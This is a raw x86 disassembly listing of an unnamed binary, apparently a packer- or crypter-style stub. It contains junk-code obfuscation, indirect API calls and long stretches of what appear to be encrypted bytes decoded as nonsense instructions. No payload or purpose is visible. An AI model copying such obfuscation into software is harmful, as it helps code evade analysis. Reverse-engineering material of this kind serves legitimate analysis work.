  4167bc:	mov    edx,DWORD PTR [ebp-0x14]
  4167bf:	mov    ebx,DWORD PTR [ebp-0x18]
  4167c2:	xor    eax,edx
  4167c4:	xor    edx,edx
  4167c6:	sub    eax,esi
  4167c8:	div    ebx
  4167ca:	pop    edx
  4167cb:	xor    eax,ecx
  4167cd:	sub    edx,eax
  4167cf:	cmp    edi,edx
  4167d1:	jbe    0x415f06
  4167d7:	pop    edi
  4167d8:	pop    esi
  4167d9:	pop    ebx
  4167da:	leave  
  4167db:	ret    0x8
  4167de:	push   ebp
  4167df:	mov    ebp,esp
  4167e1:	and    esp,0xfffffff8
  4167e4:	sub    esp,0x9c
  4167ea:	push   ebx
  4167eb:	push   esi
  4167ec:	push   edi
  4167ed:	push   DWORD PTR ds:0x422564
  4167f3:	lea    eax,[esp+0xa4]
  4167fa:	push   eax
  4167fb:	call   DWORD PTR ds:0x42dfe0
  416801:	push   DWORD PTR [esp+0xa4]
  416808:	push   DWORD PTR ds:0x422550
  41680e:	call   DWORD PTR ds:0x42e250
  416814:	push   eax
  416815:	call   DWORD PTR ds:0x42e2b0
  41681b:	cmp    DWORD PTR ds:0x428545,0x0
  416822:	mov    ecx,0x19be
  416827:	mov    ecx,0x6729
  41682c:	not    ecx
  41682e:	mov    DWORD PTR ds:0x428559,0x315f
  416838:	jmp    0x416882
  41683d:	mov    DWORD PTR ds:0x4284c5,0x96c
  416847:	cmp    DWORD PTR ds:0x428545,0x0
  41684e:	jbe    0x416866
  416854:	push   0x428137
  416859:	call   DWORD PTR ds:0x42e268
  41685f:	inc    ecx
  416860:	adc    ecx,DWORD PTR ds:0x428555
  416866:	and    DWORD PTR ds:0x4284b9,0x5e58
  416870:	mov    ecx,DWORD PTR ds:0x428419
  416876:	sub    ecx,DWORD PTR ds:0x4284f1
  41687c:	mov    DWORD PTR ds:0x428419,ecx
  416882:	mov    ecx,DWORD PTR ds:0x422918
  416888:	and    DWORD PTR ds:0x428365,0x41d
  416892:	push   0x0
  416894:	and    DWORD PTR ds:0x428555,0x4284c9
  41689e:	push   DWORD PTR [ecx]
  4168a0:	and    DWORD PTR ds:0x42844d,0x7a21
  4168aa:	call   eax
  4168ac:	mov    esi,0x1ff
  4168b1:	xor    DWORD PTR ds:0x428339,ebx
  4168b7:	mov    DWORD PTR [esp+0x24],0x3992
  4168bf:	mov    DWORD PTR [esp+0xc],0x79a2
  4168c7:	cmp    DWORD PTR ds:0x42840d,0x0
  4168ce:	mov    ecx,0x6401
  4168d3:	mov    DWORD PTR ds:0x428345,0x3a8d
  4168dd:	mov    DWORD PTR ds:0x42844d,0x1a46
  4168e7:	mov    DWORD PTR ds:0x42846d,edx
  4168ed:	jmp    0x416927
  4168f2:	movzx  eax,BYTE PTR ds:0x42840d
  4168f9:	movzx  eax,WORD PTR ds:0x428469
  416900:	cmp    DWORD PTR ds:0x42840d,0x0
  416907:	jge    0x41691f
  41690d:	push   DWORD PTR [ebp-0xc]
  416910:	push   0x3a70
  416915:	call   DWORD PTR ds:0x42e0e4
  41691b:	not    ecx
  41691d:	adc    ecx,ecx
  41691f:	xor    ecx,DWORD PTR ds:0x428569
  416925:	or     ecx,ecx
  416927:	mov    eax,DWORD PTR [esp+0xc]
  41692b:	mov    ecx,DWORD PTR [esp+0x24]
  41692f:	or     DWORD PTR ds:0x428325,0x42840d
  416939:	xor    eax,0x1d22
  41693e:	and    DWORD PTR ds:0x428355,0x1749
  416948:	imul   eax,eax,0xffffdeb4
  41694e:	or     DWORD PTR ds:0x42853d,0x428559
  416958:	and    eax,0x43eb
  41695d:	sub    eax,ecx
  41695f:	or     DWORD PTR ds:0x428401,ebx
  416965:	mov    DWORD PTR [esp+0x3c],eax
  416969:	dec    eax
  41696a:	mov    DWORD PTR [esp+0x38],0x3b18
  416972:	mov    DWORD PTR [esp+0x2c],0x6c93
  41697a:	or     eax,DWORD PTR ds:0x428465
  416980:	mov    DWORD PTR [esp+0x24],0x418e
  416988:	xor    ecx,ecx
  41698a:	mov    DWORD PTR [esp+0xc],0x5ac3
  416992:	mov    eax,DWORD PTR [esp+0xc]
  416996:	sub    ecx,DWORD PTR ds:0x42844d
  41699c:	mov    ecx,DWORD PTR [esp+0x24]
  4169a0:	sub    ecx,eax
  4169a2:	xor    eax,0x684c
  4169a7:	mov    eax,DWORD PTR [esp+0x2c]
  4169ab:	or     DWORD PTR ds:0x428551,0x4866
  4169b5:	and    ecx,eax
  4169b7:	or     DWORD PTR ds:0x4283fd,0x3518
  4169c1:	mov    eax,DWORD PTR [esp+0x38]
  4169c5:	xor    ecx,0x10d6
  4169cb:	sub    ecx,0x782c
  4169d1:	add    DWORD PTR ds:0x428435,0x3d80
  4169db:	imul   ecx,eax
  4169de:	mov    eax,DWORD PTR [esp+0x3c]
  4169e2:	mov    DWORD PTR ds:0x42834d,0x7bdf
  4169ec:	cmp    eax,ecx
  4169ee:	mov    DWORD PTR ds:0x42831d,0x6991
  4169f8:	jne    0x41701a
  4169fe:	mov    DWORD PTR [esp+0x10],0x1
  416a06:	sbb    eax,DWORD PTR ds:0x428341
  416a0c:	mov    DWORD PTR [esp+0x30],0x2f16
  416a14:	mov    DWORD PTR [esp+0x48],0x16f
  416a1c:	jmp    0x416c79
  416a21:	and    DWORD PTR [esp+ebp*1+0x3bb6ac2e],eax
  416a28:	xchg   esp,eax
  416a29:	jmp    0x4169d2
  416a2b:	int    0x90
  416a2d:	mov    edi,0xc908e5c
  416a32:	aam    0xc0
  416a34:	mov    esi,0xbebec235
  416a39:	adc    BYTE PTR [eax],al
  416a3b:	or     dl,al
  416a3d:	jl     0x416a05
  416a3f:	das    
  416a40:	rcl    BYTE PTR [edx-0xe5ec7ee],cl
  416a46:	and    eax,0x873e101
  416a4b:	pop    ss
  416a4c:	call   0xe98034e3
  416a51:	or     eax,0xd6f8c24e
  416a56:	pushf  
  416a57:	dec    esp
  416a58:	loopne 0x416aaf
  416a5a:	outs   dx,BYTE PTR ds:[esi]
  416a5b:	mov    ds:0xadd128c3,eax
  416a60:	dec    di
  416a62:	std    
  416a63:	dec    BYTE PTR ds:0x1349fba3
  416a69:	add    BYTE PTR [eax-0x48],bl
  416a6c:	stos   BYTE PTR es:[edi],al
  416a6d:	mov    ebx,0x13d676cd
  416a72:	popa   
  416a73:	jmp    0xa2bbb96
  416a78:	or     BYTE PTR [esi-0x56d4cbdb],ah
  416a7e:	jbe    0x416a1b
  416a80:	sbb    BYTE PTR [edi],bl
  416a82:	shl    DWORD PTR [ebp-0x6b],cl
  416a85:	icebp  
  416a86:	sbb    al,BYTE PTR [ebx+ebp*2+0x2b]
  416a8a:	data16 outs dx,BYTE PTR ds:[esi]
  416a8c:	adc    BYTE PTR [esi+0x17],0xda
  416a90:	pusha  
  416a91:	dec    ebp
  416a92:	(bad)  
  416a93:	xchg   esi,eax
  416a94:	mov    eax,0xd91406c2
  416a99:	xchg   ecx,eax
  416a9a:	inc    esi
  416a9b:	test   eax,0x59253519
  416aa0:	push   ds
  416aa1:	mov    eax,ds:0xcf01e090
  416aa6:	cmp    DWORD PTR [ebx],0x40
  416aa9:	cmp    BYTE PTR [esi-0x75],dl
  416aac:	inc    ebp
  416aad:	add    esp,DWORD PTR [ebx+edi*8]
  416ab0:	and    cl,bl
  416ab2:	mov    edi,eax
  416ab4:	dec    ebp
  416ab5:	int    0x4a
  416ab7:	add    cl,BYTE PTR [ebp+0x78]
  416aba:	inc    edx
  416abb:	push   edi
  416abc:	jno    0x416af1
  416abe:	ficom  WORD PTR [eax+0x69266303]
  416ac4:	add    al,0x79
  416ac6:	fdiv   QWORD PTR [eax]
  416ac8:	xchg   esp,eax
  416ac9:	imul   ecx,DWORD PTR [ebx-0x2a],0x8
  416acd:	push   esi
  416ace:	jno    0x416b30
  416ad0:	inc    ebp
  416ad1:	cli    
  416ad2:	fdivrp st(2),st
  416ad4:	push   esp
  416ad5:	lods   al,BYTE PTR ds:[esi]
  416ad6:	ins    DWORD PTR es:[edi],dx
  416ad7:	xchg   ebp,eax
  416ad8:	fbstp  TBYTE PTR ds:[eax+0x319f1dd4]
  416adf:	pop    ebx
  416ae0:	xchg   DWORD PTR [edi-0x1b],edx
  416ae3:	ror    BYTE PTR [ebp-0x7d4ca81],1
  416ae9:	cmp    eax,0x5cf4a64e
  416aee:	push   eax
  416aef:	push   ecx
  416af0:	outs   dx,BYTE PTR ds:[esi]
  416af1:	sub    DWORD PTR [ecx-0x34539e56],ebp
  416af7:	repz mov cs,eax
  416afa:	hlt    
  416afb:	ror    BYTE PTR [edi-0x70],0xec
  416aff:	rcl    BYTE PTR [ecx],cl
  416b01:	clc    
  416b02:	fbld   TBYTE PTR [edx]
  416b04:	in     al,0x6a
  416b06:	jbe    0x416b20
  416b08:	mov    ebp,0x32d66a61
  416b0d:	ss push ebx
  416b0f:	pop    es
  416b10:	sub    ch,BYTE PTR [ecx]
  416b12:	(bad)  
  416b13:	ins    BYTE PTR es:[edi],dx
  416b14:	out    dx,eax
  416b15:	aaa    
  416b16:	xchg   edx,eax
  416b17:	aaa    
  416b18:	retf   
  416b19:	pop    ebp
  416b1a:	fistp  DWORD PTR [eax+0x52abfcab]
  416b20:	dec    ecx
  416b21:	imul   DWORD PTR [ecx]
  416b23:	mov    dh,0xf3
  416b25:	dec    edx
  416b26:	jae    0x416afa
  416b28:	cmp    eax,0xea72d01c
  416b2d:	adc    BYTE PTR [ecx+esi*2],0x8
  416b31:	mov    al,ds:0x22127e99
  416b36:	mov    ah,BYTE PTR [ecx]
  416b38:	push   eax
  416b39:	pop    ss
  416b3a:	adc    DWORD PTR [edi-0x52799f3c],0xfb344c13
  416b44:	sbb    BYTE PTR [esi+eiz*4],bh
  416b47:	cmc    
  416b48:	mov    ds:0x33584f74,eax
  416b4d:	push   edx
  416b4e:	inc    ecx
  416b4f:	scas   al,BYTE PTR es:[edi]
  416b50:	push   ecx
  416b51:	int3   
  416b52:	fcom   QWORD PTR [edx-0x15f3462e]
  416b58:	pop    es
  416b59:	jne    0x416b13
  416b5b:	inc    eax
  416b5c:	sub    esp,esp
  416b5e:	aad    0xac
  416b60:	int    0xbe
  416b62:	mov    eax,0xf274a3b0
  416b67:	(bad)  
  416b68:	mov    ebp,gs
  416b6a:	test   DWORD PTR [esi+0x428b6e15],eax
  416b70:	nop
  416b71:	imul   BYTE PTR [esp+edx*4]
  416b74:	inc    esp
  416b75:	in     eax,0x1d
  416b77:	nop
  416b78:	mov    bh,0x6f
  416b7a:	xor    al,0xd5
  416b7c:	add    al,0xe2
  416b7e:	ins    DWORD PTR es:[edi],dx
  416b7f:	mov    ch,0xb2
  416b81:	and    DWORD PTR [ebx],esp
  416b83:	pop    edx
  416b84:	mov    bl,0x7c
  416b86:	add    BYTE PTR [ebp-0x5562e4e8],al
  416b8c:	dec    edi
  416b8d:	rcr    BYTE PTR [ecx-0xa66039e],cl
  416b93:	popa   
  416b94:	adc    BYTE PTR [eax],bl
  416b96:	sbb    DWORD PTR [ebp-0x55b3956],esp
  416b9c:	out    dx,eax
  416b9d:	jbe    0x416c0a
  416b9f:	ret    0x2162
  416ba2:	inc    ecx
  416ba3:	lock adc edx,DWORD PTR [edi+0x13]
  416ba7:	mov    ebx,0xc4e4b0da
  416bac:	mov    eax,0xdd9bef3c
  416bb1:	or     al,0x4
  416bb3:	adc    BYTE PTR [ebx+0x13],ch
  416bb6:	jmp    0xc7c0:0xa2b1cc38
  416bbd:	repz and al,0x24
  416bc0:	fmul   QWORD PTR es:[ecx+0x6c]
  416bc4:	jae    0x416c05
  416bc6:	add    eax,0x4fcb41fb
  416bcb:	dec    esi
  416bcc:	pop    edx
  416bcd:	add    cl,ch
  416bcf:	aam    0x92
  416bd1:	rol    ch,1
  416bd3:	xchg   esi,eax
  416bd4:	mov    dl,0xe7
  416bd6:	or     ecx,eax
  416bd8:	add    ebp,ebp
  416bda:	xor    eax,0x57948bb5
  416bdf:	retf   
  416be0:	jmp    0x416c61
  416be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416be3:	mov    ?,WORD PTR ss:[edi]
  416be6:	sbb    cl,BYTE PTR [ebx]
  416be8:	xchg   esi,eax
  416be9:	xchg   esi,eax
  416bea:	or     BYTE PTR [esi-0x78],bl
  416bed:	pop    ebx
  416bee:	inc    ebp
  416bef:	fcomp  QWORD PTR [eax+0x19]
  416bf2:	jnp    0x416c16
  416bf4:	sub    eax,0x3eef7fdf
  416bf9:	gs and esp,ecx
  416bfc:	sbb    ah,BYTE PTR [ebx-0x2]
  416bff:	iret   
  416c00:	dec    ecx
  416c01:	sti    
  416c02:	add    eax,0x22251ae5
  416c07:	xlat   BYTE PTR ds:[ebx]
  416c08:	test   esp,0xb9e5d44
  416c0e:	jge    0x416c2f
  416c10:	rcr    DWORD PTR [edx],cl
  416c12:	iret   
  416c13:	adc    BYTE PTR [edi-0x57a07161],cl
  416c19:	in     eax,dx
  416c1a:	sub    eax,0xb9eb3f3c
  416c1f:	sbb    edx,DWORD PTR [ebp+eax*8+0x75ef8fbf]
  416c26:	fdivr  QWORD PTR ds:0x3c8c15c7
  416c2c:	retf   
  416c2d:	jle    0x416c81
  416c2f:	int3   
  416c30:	add    esi,esi
  416c32:	cmp    al,0x68
  416c34:	ss aam 0x3
  416c37:	and    dl,BYTE PTR [edi+0x59]
  416c3a:	mov    cl,0x67
  416c3c:	loope  0x416c5c
  416c3e:	ins    DWORD PTR es:[edi],dx
  416c3f:	aas    
  416c40:	outs   dx,DWORD PTR ds:[esi]
  416c41:	sbb    DWORD PTR [esi],ecx
  416c43:	retf   0x3971
  416c46:	and    BYTE PTR [edx+0x29],dl
  416c49:	inc    esi
  416c4a:	xor    DWORD PTR [eax-0x2e],edx
  416c4d:	(bad)  
  416c4e:	cmp    eax,0xaaac7c06
  416c53:	cmp    DWORD PTR [edi-0x73],ecx
  416c56:	mov    edx,0xac3eb1ee
  416c5b:	cmp    DWORD PTR [ecx-0x42],ecx
  416c5e:	imul   ecx,DWORD PTR ds:0xf8bde310,0xf504b5d
  416c68:	sbb    DWORD PTR [ecx],esp
  416c6a:	dec    esp
  416c6b:	cdq    
  416c6c:	pop    ss
  416c6d:	mov    esp,0xc56742ca
  416c72:	pop    edx
  416c73:	pop    esi
  416c74:	jge    0x416c68
  416c76:	dec    esp
  416c77:	push   edx
  416c78:	rol    bh,1
  416c7a:	inc    esp
  416c7b:	and    al,0x50
  416c7d:	lds    esi,FWORD PTR [eax]
  416c7f:	add    BYTE PTR [eax],al
  416c81:	or     ecx,ecx
  416c83:	push   DWORD PTR ds:0xe5bfd6f1
  416c89:	not    eax
  416c8b:	mov    DWORD PTR [esp+0x8c],0x4ebc
  416c96:	mov    DWORD PTR [esp+0x98],0x76
  416ca1:	adc    ecx,DWORD PTR ds:0x428421
  416ca7:	mov    DWORD PTR [esp+0x40],0x556d
  416caf:	mov    DWORD PTR [esp+0x3c],0x63d5
  416cb7:	dec    eax
  416cb8:	mov    DWORD PTR [esp+0x30],0x169
  416cc0:	inc    ecx
  416cc1:	mov    DWORD PTR [esp+0x28],0x101b
  416cc9:	mov    DWORD PTR [esp+0x10],0x6bec
  416cd1:	mov    eax,DWORD PTR [esp+0x10]
  416cd5:	mov    ecx,DWORD PTR [esp+0x28]
  416cd9:	sbb    DWORD PTR ds:0x428429,0x35b0
  416ce3:	imul   eax,ecx
  416ce6:	sub    DWORD PTR ds:0x4284e1,edx
  416cec:	or     eax,0x7f7d
  416cf1:	xor    eax,0xcf336131
  416cf6:	mov    DWORD PTR ds:0x4284c5,0x5640
  416d00:	push   DWORD PTR [eax]
  416d02:	cmp    DWORD PTR ds:0x428349,0x0
  416d09:	mov    DWORD PTR ds:0x428331,edi
  416d0f:	mov    DWORD PTR ds:0x428435,0x594e
  416d19:	mov    ecx,0x35fb
  416d1e:	mov    DWORD PTR ds:0x4284ed,0x3932
  416d28:	jmp    0x416e08
  416d2d:	mov    DWORD PTR ds:0x428409,0xa9d
  416d37:	cmp    DWORD PTR ds:0x428349,0x0
  416d3e:	jg     0x416d5d
  416d44:	push   0x46ad
  416d49:	call   DWORD PTR ds:0x42e26c
  416d4f:	and    DWORD PTR ds:0x428551,0x42835d
  416d59:	adc    ecx,ecx
  416d5b:	xor    ecx,ecx
  416d5d:	and    ecx,0x3418
  416d63:	and    ecx,0x2934
  416d69:	or     ecx,ecx
  416d6b:	movzx  ecx,BYTE PTR ds:0x428355
  416d72:	adc    DWORD PTR ds:0x428429,ecx
  416d78:	cmp    DWORD PTR ds:0x428545,0x0
  416d7f:	mov    DWORD PTR ds:0x428569,edi
  416d85:	mov    DWORD PTR ds:0x428569,ebx
  416d8b:	mov    DWORD PTR ds:0x4283fd,0x662b
  416d95:	mov    DWORD PTR ds:0x428551,0x653a
  416d9f:	jmp    0x416e08
  416da4:	mov    DWORD PTR ds:0x428345,ebx
  416daa:	cmp    DWORD PTR ds:0x428545,0x0
  416db1:	jg     0x416ded
  416db7:	push   0x2fcf
  416dbc:	push   0x4281cb
  416dc1:	call   DWORD PTR ds:0x42e270
  416dc7:	mov    ecx,DWORD PTR ds:0x428521
  416dcd:	mov    ecx,DWORD PTR [ecx]
  416dcf:	adc    DWORD PTR ds:0x42855d,ecx
  416dd5:	sbb    ecx,0x197c
  416ddb:	mov    ecx,DWORD PTR ds:0x428541
  416de1:	and    DWORD PTR ds:0x428451,ecx
  416de7:	sub    ecx,0x1b1e
  416ded:	sub    ecx,DWORD PTR ds:0x428349
  416df3:	add    DWORD PTR ds:0x42832d,0x6bb0
  416dfd:	add    DWORD PTR ds:0x428359,edi
  416e03:	adc    eax,0x3de3
  416e08:	mov    eax,DWORD PTR [esp+0x34]
  416e0c:	add    eax,0x75d9
  416e11:	push   0xd
  416e13:	add    DWORD PTR ds:0x428471,ebx
  416e19:	pop    ecx
  416e1a:	xor    edx,edx
  416e1c:	div    ecx
  416e1e:	mov    ecx,DWORD PTR [esp+0x40]
  416e22:	xor    edx,edx
  416e24:	or     eax,ecx
  416e26:	sbb    DWORD PTR ds:0x428341,edi
  416e2c:	mov    ecx,DWORD PTR [esp+0x44]
  416e30:	inc    DWORD PTR ds:0x428421
  416e36:	or     eax,ecx
  416e38:	or     ecx,0x12fe
  416e3e:	mov    ecx,DWORD PTR [esp+0x9c]
  416e45:	div    ecx
  416e47:	xor    edx,edx
  416e49:	cmp    DWORD PTR ds:0x42853d,0x0
  416e50:	movzx  ecx,WORD PTR ds:0x428535
  416e57:	mov    ecx,DWORD PTR ds:0x428471
  416e5d:	jmp    0x416ec3
  416e62:	mov    DWORD PTR ds:0x428441,0x6ae9
  416e6c:	cmp    DWORD PTR ds:0x42853d,0x0
  416e73:	jg     0x416ea3
  416e79:	push   0x1
  416e7b:	call   DWORD PTR ds:0x42e0e8
  416e81:	xor    DWORD PTR ds:0x428401,edi
  416e87:	and    DWORD PTR ds:0x428361,0x7db2
  416e91:	mov    ecx,DWORD PTR ds:0x428431
  416e97:	or     DWORD PTR ds:0x428565,ecx
  416e9d:	add    DWORD PTR ds:0x4284d1,ebx
  416ea3:	or     DWORD PTR ds:0x4284c1,0xb88
  416ead:	adc    ecx,DWORD PTR ds:0x428355
  416eb3:	sub    DWORD PTR ds:0x4284b9,0x13f0
  416ebd:	sbb    DWORD PTR ds:0x428365,edx
  416ec3:	xor    eax,0x680da048
  416ec8:	cmp    DWORD PTR ds:0x4283fd,0x0
  416ecf:	mov    DWORD PTR ds:0x428321,0x5921
  416ed9:	mov    DWORD PTR ds:0x4284d1,edi
  416edf:	jmp    0x416f57
  416ee4:	mov    ecx,0x423c
  416ee9:	cmp    DWORD PTR ds:0x4283fd,0x0
  416ef0:	jne    0x416f33
  416ef6:	push   0x145c
  416efb:	push   0x428341
  416f00:	call   DWORD PTR ds:0x42e274
  416f06:	adc    DWORD PTR ds:0x4284c1,0x2a49
  416f10:	and    DWORD PTR ds:0x428551,0x95c
  416f1a:	movzx  ecx,BYTE PTR ds:0x42844d
  416f21:	adc    DWORD PTR ds:0x428465,ecx
  416f27:	mov    ecx,DWORD PTR ds:0x428535
  416f2d:	adc    DWORD PTR ds:0x428411,ecx
  416f33:	or     DWORD PTR ds:0x428351,0x75b4
  416f3d:	adc    DWORD PTR ds:0x4284b5,edx
  416f43:	or     DWORD PTR ds:0x4284ed,0x469c
  416f4d:	or     DWORD PTR ds:0x428449,0x5212
  416f57:	push   DWORD PTR [eax]
  416f59:	adc    DWORD PTR ds:0x428451,0x3264
  416f63:	mov    eax,DWORD PTR [esp+0x94]
  416f6a:	mov    ecx,DWORD PTR ds:0x428411
  416f70:	or     ecx,DWORD PTR ds:0x4284f1
  416f76:	mov    DWORD PTR ds:0x428411,ecx
  416f7c:	mov    ecx,DWORD PTR [esp+0x5c]
  416f80:	push   DWORD PTR ds:0x4facd31
  416f86:	sbb    DWORD PTR ds:0x428545,0x428541
  416f90:	add    eax,0xb4a
  416f95:	push   DWORD PTR ds:0x1e6ebff7
  416f9b:	imul   eax,ecx
  416f9e:	push   DWORD PTR [eax-0x3f17647c]
  416fa4:	add    DWORD PTR ds:0x428365,0x6df5
  416fae:	mov    eax,DWORD PTR [esp+0x60]
  416fb2:	mov    ecx,DWORD PTR [esp+0x48]
  416fb6:	sub    DWORD PTR ds:0x4283f5,0x428435
  416fc0:	xor    eax,ecx
  416fc2:	sub    DWORD PTR ds:0x428541,0x5fb7
  416fcc:	mov    ecx,DWORD PTR [esp+0x28]
  416fd0:	or     DWORD PTR ds:0x428339,0x42831d
  416fda:	div    ecx
  416fdc:	sbb    DWORD PTR ds:0x42831d,0x428355
  416fe6:	and    eax,0x100
  416feb:	xor    DWORD PTR ds:0x428449,0x79f1
  416ff5:	or     eax,0x290
  416ffa:	add    DWORD PTR ds:0x42835d,0x42831d
  417004:	push   DWORD PTR [eax-0x494a7887]
  41700a:	xor    DWORD PTR ds:0x428415,0x4284e5
  417014:	call   DWORD PTR ds:0x42e124
  41701a:	or     DWORD PTR ds:0x4284c1,0x74bf
  417024:	dec    esi
  417025:	mov    DWORD PTR ds:0x428441,0x5180
  41702f:	jne    0x4168b1
  417035:	mov    DWORD PTR [esp+0x18],0xcb79b576
  41703d:	cmp    DWORD PTR ds:0x4284c5,0x0
  417044:	not    DWORD PTR ds:0x428409
  41704a:	mov    DWORD PTR ds:0x4284cd,0x4717
  417054:	jmp    0x4170cc
  417059:	movzx  esi,BYTE PTR ds:0x42834d
  417060:	cmp    DWORD PTR ds:0x4284c5,0x0
  417067:	jae    0x41709b
  41706d:	push   0x4281a5
  417072:	push   0x6423
  417077:	push   DWORD PTR [ebp-0xc]
  41707a:	push   DWORD PTR [ebp-0x1c]
  41707d:	push   DWORD PTR [ebp-0x28]
  417080:	push   0x1c3a
  417085:	call   DWORD PTR ds:0x42e278
  41708b:	or     DWORD PTR ds:0x428329,edi
  417091:	xor    DWORD PTR ds:0x428449,0x58f
  41709b:	sbb    DWORD PTR ds:0x42845d,ecx
  4170a1:	sub    DWORD PTR ds:0x428551,0x607b
  4170ab:	mov    esi,DWORD PTR ds:0x4283cd
  4170b1:	mov    esi,DWORD PTR [esi]
  4170b3:	or     DWORD PTR ds:0x428571,esi
  4170b9:	movzx  esi,BYTE PTR ds:0x428451
  4170c0:	add    esi,DWORD PTR ds:0x4284f1
  4170c6:	mov    DWORD PTR ds:0x428451,esi
  4170cc:	mov    esi,0x9c2b8ae8
  4170d1:	sub    DWORD PTR ds:0x42835d,0x428431
  4170db:	mov    DWORD PTR [esp+0x1c],esi
  4170df:	mov    DWORD PTR [esp+0x70],0xcb79b572
  4170e7:	mov    DWORD PTR [esp+0x74],esi
  4170eb:	call   0x408bfd
  4170f0:	sbb    edi,edx
  4170f2:	jmp    0x41734f
  4170f7:	add    edi,DWORD PTR [esi]
  4170f9:	popf   
  4170fa:	jmp    0x4170a0
  4170fc:	sub    al,0x8c
  4170fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170ff:	scas   eax,DWORD PTR es:[di]
  417101:	xchg   esi,eax
  417102:	jecxz  0x41716f
  417104:	push   0xd88490e3
  417109:	sar    BYTE PTR [esi-0x41413dcb],0xa0
  417110:	push   edx
  417111:	dec    edi
  417112:	les    ebp,FWORD PTR [eax-0x5ac09e7f]
  417118:	stos   DWORD PTR es:[edi],eax
  417119:	mov    bl,0x8e
  41711b:	xchg   esi,eax
  41711c:	js     0x4170a0
  41711e:	pop    edx
  41711f:	sbb    DWORD PTR [esi-0x211f1cf9],edx
  417125:	push   ds
  417126:	xlat   BYTE PTR ds:[ebx]
  417127:	bnd jb 0x41717c
  41712a:	aad    0x2b
  41712c:	fistp  DWORD PTR [ebx-0x54bdc29f]
  417132:	mov    al,bh
  417134:	xchg   ebp,ebx
  417136:	adc    al,0xf0
  417138:	mov    ss:0x8fe522cd,eax
  41713e:	cld    
  41713f:	push   es
  417140:	jae    0x41713f
  417142:	mov    al,0x65
  417144:	push   ecx
  417145:	xchg   ebp,eax
  417146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417147:	and    ecx,DWORD PTR [ecx]
  417149:	jbe    0x4170de
  41714b:	mov    ch,0x4c
  41714d:	dec    BYTE PTR [ebx+0x6c00400]
  417153:	inc    esi
  417154:	shl    DWORD PTR [ecx+eiz*4-0x784a9f5e],1
  41715b:	jecxz  0x417103
  41715d:	scas   eax,DWORD PTR es:[edi]
  41715e:	cmp    al,0x6c
  417160:	inc    esp
  417161:	push   ds
  417162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417163:	cmp    al,0x3d
  417165:	inc    esi
  417166:	sbb    ebx,ebp
  417168:	bound  ebp,QWORD PTR ds:0x52b06399
  41716e:	(bad)  
  41716f:	jno    0x41711c
  417171:	into   
  417172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417173:	pop    edi
  417174:	rol    BYTE PTR [eax+0x4884c92e],1
  41717a:	mov    DWORD PTR [eax+0x358c416c],ebx
  417180:	and    eax,0x891e065b
  417185:	fst    QWORD PTR [eax+0x4aa571e3]
  41718b:	jns    0x417113
  41718d:	xchg   ecx,eax
  41718e:	sbb    esp,DWORD PTR [ecx-0x6d]
  417191:	enter  0xcc0f,0x8
  417195:	sbb    DWORD PTR [esi+0x17],esp
  417198:	push   ss
  417199:	add    eax,0x6dd79179
  41719e:	push   es
  41719f:	mov    al,0xe0
  4171a1:	or     ebp,DWORD PTR [esi+ebp*4+0x4c]
  4171a5:	push   ecx
  4171a6:	adc    al,0x98
  4171a8:	add    eax,0xd6db5926
  4171ad:	lock mov eax,DWORD PTR ds:0xc3ef9a9a
  4171b4:	mov    esi,0x4df148ab
  4171b9:	pop    edx
  4171ba:	sbb    ebx,DWORD PTR [esi]
  4171bc:	adc    ebx,DWORD PTR [edi+ebx*8-0x5d]
  4171c0:	pusha  
  4171c1:	je     0x4171fd
  4171c3:	jp     0x41722f
  4171c5:	jge    0x4171aa
  4171c7:	test   DWORD PTR [esi+0x66],0x47e69a60
  4171ce:	popa   
  4171cf:	adc    eax,0x35caf49a
  4171d4:	pop    es
  4171d5:	sub    eax,0x1849e131
  4171da:	pop    ebx
  4171db:	and    DWORD PTR [ecx-0x6ed30065],edx
  4171e1:	xchg   edi,eax
  4171e2:	scas   al,BYTE PTR es:[edi]
  4171e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171e4:	out    0x9f,eax
  4171e6:	xor    ebp,DWORD PTR [esp+eiz*4]
  4171e9:	ret    
  4171ea:	push   es
  4171eb:	pop    esp
  4171ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171ed:	xchg   edi,eax
  4171ee:	cmc    
  4171ef:	xor    eax,0x9b01223a
  4171f4:	cmc    
  4171f5:	mov    eax,0xd44b3402
  4171fa:	(bad)  
  4171fb:	fcom   st(4)
  4171fd:	sti    
  4171fe:	adc    BYTE PTR [eax-0x4d],cl
  417201:	inc    ebp
  417202:	xchg   BYTE PTR [eax],bh
  417204:	aad    0x8d
  417206:	xchg   esp,eax
  417207:	pop    esp
  417208:	jg     0x41718c
  41720a:	dec    ecx
  41720b:	sbb    eax,0x69bd122c
  417210:	fldcw  WORD PTR [edx-0x7]
  417213:	imul   ebp,DWORD PTR [edi+0x78759f67],0xb7a06680
  41721d:	mov    fs,WORD PTR [edx]
  41721f:	out    dx,eax
  417220:	xlat   BYTE PTR ds:[ebx]
  417221:	lods   eax,DWORD PTR ds:[esi]
  417222:	push   esi
  417223:	cmp    edx,DWORD PTR [esi]
  417225:	sbb    al,0x63
  417227:	pop    ss
  417228:	aad    0xae
  41722a:	outs   dx,DWORD PTR es:[esi]
  41722c:	outs   dx,BYTE PTR ds:[esi]
  41722d:	or     DWORD PTR [esi+0x25a496ca],esp
  417233:	mov    ds:0x598c70ab,eax
  417238:	dec    ecx
  417239:	es sub al,0x89
  41723c:	fisttp WORD PTR [edi+0x669c72ca]
  417242:	mov    ds:0xde16da5f,al
  417247:	sbb    eax,0x60629879
  41724c:	xor    dl,BYTE PTR [edi]
  41724e:	retf   
  41724f:	and    bh,cl
  417251:	inc    edi
  417252:	mov    edi,0x18560063
  417257:	(bad)  [ecx+0x7d99d0d]
  41725d:	push   edi
  41725e:	adc    bh,BYTE PTR [ebx+0x1d48c057]
  417264:	loope  0x417250
  417266:	ror    ch,cl
  417268:	imul   edi,edx,0x3a
  41726b:	xor    al,0x7f
  41726e:	(bad)  
  417270:	hlt    
  417271:	push   edx
  417272:	repz inc edx
  417274:	xchg   DWORD PTR [edi],edx
  417276:	and    al,0x35
  417278:	mov    ebx,0x37578d5f
  41727d:	mov    eax,ds:0x4e0e5e73
  417282:	xchg   ecx,eax
  417283:	sbb    dh,BYTE PTR [ebp-0x1b]
